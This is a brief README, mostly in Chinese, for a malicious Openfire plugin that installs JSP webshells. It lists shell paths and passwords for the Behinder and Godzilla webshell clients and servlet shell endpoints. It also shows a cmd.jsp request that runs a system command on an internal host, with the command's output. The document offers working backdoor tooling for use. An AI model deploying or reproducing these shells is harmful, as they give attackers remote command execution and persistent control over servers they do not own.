# build requirements:
ant1.9
jdk1.6

上传 openfire_shells/src/plugins/test/bin 下的test.jar后


```
usages:

/plugins/test/re2.jsp pass 冰蝎2.0 
/plugins/test/re3.jsp rebeyond 冰蝎3.0
/plugins/test/god.jsp pass  哥斯拉v1.0 =>> v3.03

/plugins/servlet/chropper?
/plugins/servlet/test?
```

漏洞利用：

0x01 执行系统命令

`http://10.20.31.189:9090/plugins/test/cmd.jsp?pwd=023&i=id

```
uid=102(openfire) gid=105(openfire) groups=105(openfire)

```

冰蝎由于请求的包返回在
<div id="jive-main-content">标签内，客户端导致无法获取相关数据，提示“页面存在，但是无法获取秘钥”
